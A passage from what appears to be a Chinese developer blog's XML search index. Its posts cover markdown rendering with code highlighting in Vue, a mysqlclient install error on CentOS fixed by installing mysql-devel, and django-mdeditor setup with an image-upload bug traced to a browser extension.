rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3解析markdown解析并实现代码高亮显示</title>
      <link href="/posts/e37e6718/"/>
      <url>/posts/e37e6718/</url>
      
        <content type="html"><![CDATA[<p>Vue实现博客前端，需要实现markdown的解析，如果有代码则需要实现代码的高亮。<br>Vue的markdown解析库有很多，如markdown-it、vue-markdown-loader、marked、vue-markdown等。这些库都大同小异。这里选用的是marked，代码高亮的库选用的是highlight.js。</p><p>具体实现步骤如下：</p><h2 id="一、安装依赖库"><a href="#一、安装依赖库" class="headerlink" title="一、安装依赖库"></a>一、安装依赖库</h2><p>在vue项目下打开命令窗口，并输入以下命令</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install marked -save    <span class="comment">// marked 用于将markdown转换成html</span></span><br><span class="line">npm install highlight.js -save   <span class="comment">//用于代码高亮显示</span></span><br></pre></td></tr></table></figure><p>命令执行完后可以在控制台或package.json文件中看到有安装的版本号<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220719/package.png" alt="package.json文件中看到有安装的版本号"></p><h2 id="二、在main-js文件中引入highlight-js及样式并创建一个自定义的全局指令"><a href="#二、在main-js文件中引入highlight-js及样式并创建一个自定义的全局指令" class="headerlink" title="二、在main.js文件中引入highlight.js及样式并创建一个自定义的全局指令"></a>二、在main.js文件中引入highlight.js及样式并创建一个自定义的全局指令</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hljs <span class="keyword">from</span> <span class="string">'highlight.js'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'highlight.js/styles/atom-one-dark.css'</span> <span class="comment">//样式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建v-highlight全局指令</span></span><br><span class="line">Vue.directive(<span class="string">'highlight'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blocks = el.querySelectorAll(<span class="string">'pre code'</span>);</span><br><span class="line">  blocks.forEach(<span class="function">(<span class="params">block</span>)=&gt;</span>&#123;</span><br><span class="line">    hljs.highlightBlock(block)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样就可以在vue组件中使用v-highlight引用代码高亮的方法了。</p><h2 id="三、在Vue组件中应用marked解析及实现代码高亮"><a href="#三、在Vue组件中应用marked解析及实现代码高亮" class="headerlink" title="三、在Vue组件中应用marked解析及实现代码高亮"></a>三、在Vue组件中应用marked解析及实现代码高亮</h2><p>代码示例如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!-- 正文输出 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"entry-content"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-highlight</span> <span class="attr">v-html</span>=<span class="string">"article"</span>  <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 将marked 引入</span></span><br><span class="line">  <span class="keyword">import</span> &#123; marked &#125;<span class="keyword">from</span> <span class="string">'marked'</span>;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">        name: <span class="string">'articles'</span>,</span><br><span class="line">        data()&#123;</span><br><span class="line">          <span class="keyword">return</span>&#123;</span><br><span class="line">              article:<span class="string">''</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">          getPostDetail() &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'getPostDetail()'</span>+<span class="keyword">this</span>.id)</span><br><span class="line">            fetchPostDetail(<span class="keyword">this</span>.id).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">               <span class="keyword">this</span>.postdetail=res.data</span><br><span class="line">               <span class="comment">// 调用marked()方法，将markdown转换成html</span></span><br><span class="line">               <span class="keyword">this</span>.article= marked(<span class="keyword">this</span>.postdetail.content);</span><br><span class="line">               <span class="built_in">console</span>.log(res.data)</span><br><span class="line">              &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                  <span class="built_in">console</span>.log(err)</span><br><span class="line">              &#125;)</span><br><span class="line"></span><br><span class="line">          &#125;,</span><br><span class="line">        created() &#123;</span><br><span class="line">          <span class="comment">//调用获取文章内容的接口方法</span></span><br><span class="line">          <span class="keyword">this</span>.getPostDetail()</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、显示效果"><a href="#四、显示效果" class="headerlink" title="四、显示效果"></a>四、显示效果</h2><p>markdown解析及代码高亮显示效果<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220719/markdown%E8%A7%A3%E6%9E%90%E6%95%88%E6%9E%9C.png" alt="在这里插入图片描述"></p><p>示例中引用的样式是 <code>import &#39;highlight.js/styles/atom-one-dark.css&#39;</code><br>实际highlight.js/styles中提供了很多样式，可以根据自己的喜好选用。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220719/%E9%AB%98%E4%BA%AE%E6%A0%B7%E5%BC%8F.png" alt="代码高亮样式"></p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3.9环境安装mysqlclient报python setup.py egg_info did not run successfully错避坑</title>
      <link href="/posts/7435f815/"/>
      <url>/posts/7435f815/</url>
      
        <content type="html"><![CDATA[<p>MySQL是常用的开源数据库，Python环境下django框架连接MySQL数据库用的是mysqlclient库，今天在用pip安装mysqlclient库时报错，特记录一下，避免后续继续踩坑。</p><h1 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a>环境说明：</h1><p>操作系统：CentOS Linux 7.2<br>Python版本：Python 3.9.13<br>pip版本：pip 22.1.2</p><h1 id="报错信息："><a href="#报错信息：" class="headerlink" title="报错信息："></a>报错信息：</h1><p>执行<code>pip3 install mysqlclient==2.1.1</code> 报错<br>报错信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Using cached http://mirrors.aliyun.com/pypi/packages/50/5f/eac919b88b9df39bbe4a855f136d58f80d191cfea34a3dcf96bf5d8ace0a/mysqlclient-2.1.1.tar.gz (88 kB)</span><br><span class="line">  Preparing metadata (setup.py) ... error</span><br><span class="line">  error: subprocess-exited-with-error</span><br><span class="line">  </span><br><span class="line">  × python setup.py egg_info did not run successfully.</span><br><span class="line">  │ <span class="built_in">exit</span> code: 1</span><br><span class="line">  ╰─&gt; [16 lines of output]</span><br><span class="line">      /bin/sh: mysql_config: <span class="built_in">command</span> not found</span><br><span class="line">      /bin/sh: mariadb_config: <span class="built_in">command</span> not found</span><br><span class="line">      /bin/sh: mysql_config: <span class="built_in">command</span> not found</span><br><span class="line">      Traceback (most recent call last):</span><br><span class="line">        File <span class="string">"&lt;string&gt;"</span>, line 2, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">        File <span class="string">"&lt;pip-setuptools-caller&gt;"</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">        File <span class="string">"/tmp/pip-install-i1nt_asj/mysqlclient_1b92535d58cd440b8797686ac8bc9882/setup.py"</span>, line 15, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">          metadata, options = get_config()</span><br><span class="line">        File <span class="string">"/tmp/pip-install-i1nt_asj/mysqlclient_1b92535d58cd440b8797686ac8bc9882/setup_posix.py"</span>, line 70, <span class="keyword">in</span> get_config</span><br><span class="line">          libs = mysql_config(<span class="string">"libs"</span>)</span><br><span class="line">        File <span class="string">"/tmp/pip-install-i1nt_asj/mysqlclient_1b92535d58cd440b8797686ac8bc9882/setup_posix.py"</span>, line 31, <span class="keyword">in</span> mysql_config</span><br><span class="line">          raise OSError(<span class="string">"&#123;&#125; not found"</span>.format(_mysql_config_path))</span><br><span class="line">      OSError: mysql_config not found</span><br><span class="line">      mysql_config --version</span><br><span class="line">      mariadb_config --version</span><br><span class="line">      mysql_config --libs</span><br><span class="line">      [end of output]</span><br><span class="line">  </span><br><span class="line">  note: This error originates from a subprocess, and is likely not a problem with pip.</span><br><span class="line">error: metadata-generation-failed</span><br><span class="line"></span><br><span class="line">× Encountered error <span class="keyword">while</span> generating package metadata.</span><br><span class="line">╰─&gt; See above <span class="keyword">for</span> output.</span><br><span class="line"></span><br><span class="line">note: This is an issue with the package mentioned above, not pip.</span><br><span class="line">hint: See above <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220716/mysqlclient%E5%AE%89%E8%A3%85%E6%8A%A5%E9%94%99.png" alt="mysqlclient报错"></p><h1 id="避坑："><a href="#避坑：" class="headerlink" title="避坑："></a>避坑：</h1><p><strong>从报错信息看是找不到mysql_config</strong><br>通过<code>whereis mysql_config</code>命令查看mysql_config<br>发现mysql_confg没有<br><strong>执行<code>yum install mysql-devel</code> 安装mysql-devel</strong><br>执行whereis mysql_config命令查看mysql_config这时mysql_config有了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config: /usr/bin/mysql_config /usr/share/man/man1/mysql_config.1.gz</span><br></pre></td></tr></table></figure><p>再次执行pip安装命令安装成功！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pip3 install mysqlclient==2.1.1</span><br><span class="line"></span><br><span class="line">Looking <span class="keyword">in</span> indexes: http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">Collecting mysqlclient==2.1.1</span><br><span class="line">  Using cached http://mirrors.aliyun.com/pypi/packages/50/5f/eac919b88b9df39bbe4a855f136d58f80d191cfea34a3dcf96bf5d8ace0a/mysqlclient-2.1.1.tar.gz (88 kB)</span><br><span class="line">  Preparing metadata (setup.py) ... <span class="keyword">done</span></span><br><span class="line">Using legacy <span class="string">'setup.py install'</span> <span class="keyword">for</span> mysqlclient, since package <span class="string">'wheel'</span> is not installed.</span><br><span class="line">Installing collected packages: mysqlclient</span><br><span class="line">  Running setup.py install <span class="keyword">for</span> mysqlclient ... <span class="keyword">done</span></span><br><span class="line">Successfully installed mysqlclient-2.1.1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django加入markdown编辑器及markdown上传图片不回显避坑</title>
      <link href="/posts/462af16b/"/>
      <url>/posts/462af16b/</url>
      
        <content type="html"><![CDATA[<p>一般来说一个CMS系统如博客系统都需要一个好的富文本编辑器，现在大家更多的是选择MarkDown编辑器来编辑内容。Django作为python的主流web开发框架当然少不了markdown的插件。本文介绍如何在Django框架中引入markdown编辑器及在使用markdown时的注意事项。</p><p>在Django框架中引入markdown编辑器主要是通过安装引入Django-mdeditor库来实现。<br>Django-mdeditor 是基于 Editor.md 的一个 django Markdown 文本编辑插件应用。<br>其官方下载地址见 <a href="https://pypi.org/project/django-mdeditor/" target="_blank" rel="noopener">https://pypi.org/project/django-mdeditor/</a><br>根据官方指导文档</p><h1 id="一、安装使用"><a href="#一、安装使用" class="headerlink" title="一、安装使用"></a>一、安装使用</h1><h2 id="1、安装django-mdeditor"><a href="#1、安装django-mdeditor" class="headerlink" title="1、安装django-mdeditor"></a>1、安装django-mdeditor</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django-mdeditor</span><br></pre></td></tr></table></figure><h2 id="2、在-settings-配置文件-INSTALLED-APPS-中添加-mdeditor"><a href="#2、在-settings-配置文件-INSTALLED-APPS-中添加-mdeditor" class="headerlink" title="2、在 settings 配置文件 INSTALLED_APPS 中添加 mdeditor"></a>2、在 settings 配置文件 INSTALLED_APPS 中添加 mdeditor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">'blog'</span>,</span><br><span class="line">    <span class="string">'django.contrib.admin'</span>,</span><br><span class="line">    <span class="string">'django.contrib.auth'</span>,</span><br><span class="line">    <span class="string">'django.contrib.contenttypes'</span>,</span><br><span class="line">    <span class="string">'django.contrib.sessions'</span>,</span><br><span class="line">    <span class="string">'django.contrib.messages'</span>,</span><br><span class="line">    <span class="string">'django.contrib.staticfiles'</span>,</span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">    <span class="string">'django_filters'</span>,<span class="comment">#注册条件查询</span></span><br><span class="line">    <span class="comment"># 注册markdown的应用</span></span><br><span class="line">    <span class="string">'mdeditor'</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="3、针对django3-0-修改-frame-配置"><a href="#3、针对django3-0-修改-frame-配置" class="headerlink" title="3、针对django3.0+修改 frame 配置"></a>3、针对django3.0+修改 frame 配置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X_FRAME_OPTIONS = <span class="string">'SAMEORIGIN'</span>  <span class="comment"># django 3.0 + 默认为 deny</span></span><br></pre></td></tr></table></figure><h2 id="4、在-settings-中添加媒体文件的路径配置"><a href="#4、在-settings-中添加媒体文件的路径配置" class="headerlink" title="4、在 settings 中添加媒体文件的路径配置"></a>4、在 settings 中添加媒体文件的路径配置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MEDIA_URL = <span class="string">'/media/'</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'uploads'</span>)</span><br></pre></td></tr></table></figure><p>在你项目根目录下创建 uploads/editor 目录，用于存放上传的图片。</p><h2 id="5、在项目的根-urls-py-中添加扩展url和媒体文件url"><a href="#5、在项目的根-urls-py-中添加扩展url和媒体文件url" class="headerlink" title="5、在项目的根 urls.py 中添加扩展url和媒体文件url:"></a>5、在项目的根 urls.py 中添加扩展url和媒体文件url:</h2><p>注意是在项目的根 urls.py 中添加扩展url和媒体文件url，而不是在其他项目应用的urls.py中添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url, include</span><br><span class="line"><span class="keyword">from</span> django.conf.urls.static <span class="keyword">import</span> static</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    ...</span><br><span class="line">    url(<span class="string">r'mdeditor/'</span>, include(<span class="string">'mdeditor.urls'</span>))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> settings.DEBUG:</span><br><span class="line">    <span class="comment"># static files (images, css, javascript, etc.)</span></span><br><span class="line">    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)</span><br></pre></td></tr></table></figure><h2 id="6、在项目model中应用markdown"><a href="#6、在项目model中应用markdown" class="headerlink" title="6、在项目model中应用markdown"></a>6、在项目model中应用markdown</h2><p>示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''博客文章'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogPost</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    title = models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'文章标题'</span>, unique = <span class="literal">True</span>)</span><br><span class="line">    category = models.ForeignKey(BlogCategory, blank=<span class="literal">True</span>, null=<span class="literal">True</span>, verbose_name=<span class="string">'文章分类'</span>, on_delete=models.DO_NOTHING)</span><br><span class="line">    isTop=models.BooleanField(default=<span class="literal">False</span>,verbose_name=<span class="string">'是否置顶'</span>)</span><br><span class="line">    isHot=models.BooleanField(default=<span class="literal">False</span>,verbose_name=<span class="string">'是否热门'</span>)</span><br><span class="line">    summary=models.CharField(max_length=<span class="number">500</span>,verbose_name=<span class="string">'内容摘要'</span>,default=<span class="string">''</span>)</span><br><span class="line">    content=MDTextField(verbose_name=<span class="string">'内容'</span>)</span><br><span class="line">    viewsCount= models.IntegerField(default=<span class="number">0</span>, verbose_name=<span class="string">"查看数"</span>)</span><br><span class="line">    commentsCount=models.IntegerField(default=<span class="number">0</span>, verbose_name=<span class="string">"评论数"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name = <span class="string">'博客文章'</span></span><br><span class="line">        verbose_name_plural = <span class="string">'博客文章'</span></span><br></pre></td></tr></table></figure><p>见 <code>content=MDTextField(verbose_name=&#39;内容&#39;)</code> 表示博客文章的内容是MDTextField</p><h2 id="7、向-admin-py-中注册model"><a href="#7、向-admin-py-中注册model" class="headerlink" title="7、向 admin.py 中注册model:"></a>7、向 admin.py 中注册model:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> blog.models <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># Register your models here.</span></span><br><span class="line"><span class="meta">@admin.register(BlogPost)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogPostAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'title'</span>,<span class="string">'category'</span>,<span class="string">'isTop'</span>,<span class="string">'isHot'</span>]</span><br></pre></td></tr></table></figure><h2 id="8、迁移创建数据表"><a href="#8、迁移创建数据表" class="headerlink" title="8、迁移创建数据表"></a>8、迁移创建数据表</h2><p>运行 <code>python manage.py makemigrations</code> 和 <code>python manage.py migrate</code> 来创建你的model 数据库表，可以看到默认创建的content字段是longtext类型的<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/content%E5%AD%97%E6%AE%B5.png" alt="默认创建的content字段是longtext类型的"></p><h2 id="9、测试验证"><a href="#9、测试验证" class="headerlink" title="9、测试验证"></a>9、测试验证</h2><p>启动应用，访问<a href="http://127.0.0.1:8000/admin/" target="_blank" rel="noopener">http://127.0.0.1:8000/admin/</a> 点击新增博客文章，可以看到内容字段是markdown编辑器输入了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/django%E6%98%BE%E7%A4%BAmarkdown.png" alt="markdown编辑器"></p><p>至此django应用中就可以使用markdown编辑器了。</p><h1 id="二、markdown上传图片不回显避坑"><a href="#二、markdown上传图片不回显避坑" class="headerlink" title="二、markdown上传图片不回显避坑"></a>二、markdown上传图片不回显避坑</h1><p>按照以上步骤配置django-mdeditor,markdown编辑器可以正常使用，但是这里有个大坑，就是有些浏览器在上传图片后上传的图片不回显！<br>我就碰到了这样的情况。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%83%85%E5%86%B5.png" alt="上传图片后上传的图片不回显"></p><p>在添加图片界面选择本地上传图片后发现后台接口调到了 <code>/mdeditor/uploads/?guid=1657867564930</code> 接口并且返回了200，但是上传的图片地址不回显，提交报“错误：图片地址不能为空。” 这就奇了怪了。<br>打开浏览器的调试工具，发现报了一个错，<code>Uncaught SyntaxError: Unexpected token 下 in JSON at position 141</code></p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87js%E6%8A%A5%E9%94%99.png" alt="浏览器的调试工具，发现报了一个错"></p><p>点击详情，具体应该是获取的JSON无法解析。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87js%E6%8A%A5%E9%94%99%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81.png" alt="JSON无法解析"></p><p>这个JSON为什么无法解析呢？开始进一步调试，这个JSON是上传时调用的后台上传方法返回的。所以来看看是不是后台上传接口返回的JSON串有什么问题。找到/mdeditor/uploads路由所对应的源码</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%B0%83%E8%AF%95%E8%B7%AF%E7%94%B1%E8%A7%86%E5%9B%BE.png" alt="/mdeditor/uploads路由所对应的源码"></p><p>UploadView的源代码，就是返回一个成功的json报文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> JsonResponse(&#123;<span class="string">'success'</span>: <span class="number">1</span>,</span><br><span class="line">                     <span class="string">'message'</span>: <span class="string">"上传成功！"</span>,</span><br><span class="line">                     <span class="string">'url'</span>: os.path.join(settings.MEDIA_URL,</span><br><span class="line">                                         MDEDITOR_CONFIGS[<span class="string">'image_folder'</span>],</span><br><span class="line">                                         file_full_name)&#125;)</span><br></pre></td></tr></table></figure><p>实际打断点debug也是正常返回上传成功的json报文。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%B0%83%E8%AF%95json.png" alt="打断点debug也是正常返回上传成功的json报文"></p><p>这就有点奇怪了，接口返回了正常的json报文怎么就解析不了了呢？接着继续调前台js代码，看究竟是什么原因。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%B0%83%E8%AF%95json%E5%A4%9A%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt="json串里多了几个字“下载视频”!"></p><p>发现js获取的json串里多了几个字“下载视频”! 这是什么鬼？实在是没有地方有返回“下载视频”这几个字啊？看js代码是通过iframe来处理请求的，再来看看iframe的内容，发现iframe里确实有“下载视频”</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%B0%83%E8%AF%95iframe.png" alt="iframe里确实有“下载视频”"></p><p>原来是有个chrome浏览器插件，擅自给加了“下载视频”的内容。再来看浏览器装了些啥插件。原来是有个迅雷插件，应该就是这个插件搞的鬼了，罪魁祸首就是它了！<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E4%B8%8D%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0%E5%A4%9A%E4%BA%86%E8%BF%85%E9%9B%B7%E6%8F%92%E4%BB%B6.png" alt="罪魁祸首迅雷插件"></p><p>把这个迅雷插件删除或停用，果然一切正常！可以正常回显！！！</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%9B%9E%E6%98%BE%E6%AD%A3%E5%B8%B8.png" alt="可以正常回显"></p><p>显示插入的图片</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220715/markdown%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%AD%A3%E5%B8%B8.png" alt="显示插入的图片"></p><p>所以，碰到markdown上传图片不回显的情况，先看下自己的浏览器是不是开启了迅雷插件应用，如果开启了迅雷插件应用先停用或删除！</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django的restframework接口框架自定义返回数据格式</title>
      <link href="/posts/1dea176f/"/>
      <url>/posts/1dea176f/</url>
      
